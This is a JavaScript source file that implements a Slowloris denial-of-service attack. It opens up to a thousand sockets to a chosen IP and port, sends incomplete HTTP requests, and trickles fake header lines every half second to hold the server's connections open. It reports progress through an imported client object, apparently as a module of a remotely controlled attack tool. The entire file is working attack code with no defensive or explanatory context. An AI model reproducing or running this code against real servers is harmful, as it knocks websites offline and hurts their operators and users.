import net from "net";
import { client } from "../client.js";

export default function slowLoris(ip, port, attackDuration, sockets) {
  if (ip === (undefined || "")) ip = "127.0.0.1";
  if (port === (undefined || "")) port = 80;
  if (attackDuration === (undefined || "")) attackDuration = 60000;
  if (sockets === (undefined || "")) sockets = 1000;

  if (attackDuration) {
    setTimeout(() => {
      client.write("Attack completed!");
    //   process.exit(1);
    }, attackDuration);
  }

  let activeSockets = 0;
  let socketsTargetReached = false;

  const createSocket = () => {
    const socket = net.connect(port, ip, () => {
      if (++activeSockets == sockets) socketsTargetReached = true;

      if (!socketsTargetReached)
        client.write(
          `\nCreating ${sockets} sockets ... ${parseInt(
            (activeSockets / sockets) * 100
          )}`
        );
    //   else client.write(`Attack sent to ${ip}:${port} for ${attackDuration}ms!`);

      socket.write("GET / HTTP/1.1\r\n");
      socket.write(`Host: ${ip}\r\n`);
      socket.write("Accept: */*\r\n");
      socket.write(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n"
      );

      setInterval(() => {
        socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
      }, 500);
    });

    socket.setTimeout(0);

    socket.on("error", (err) => {
      socket.destroy();
      createSocket();
    });
  };

  for (let i = 0; i < sockets; i++) {
    createSocket();
  }

  setTimeout(() => {
    if (activeSockets === 0) {
      client.write(`\nCould not connect to ${ip}:${port}`);
    //   process.exit(1);
    }
  }, 10000);
}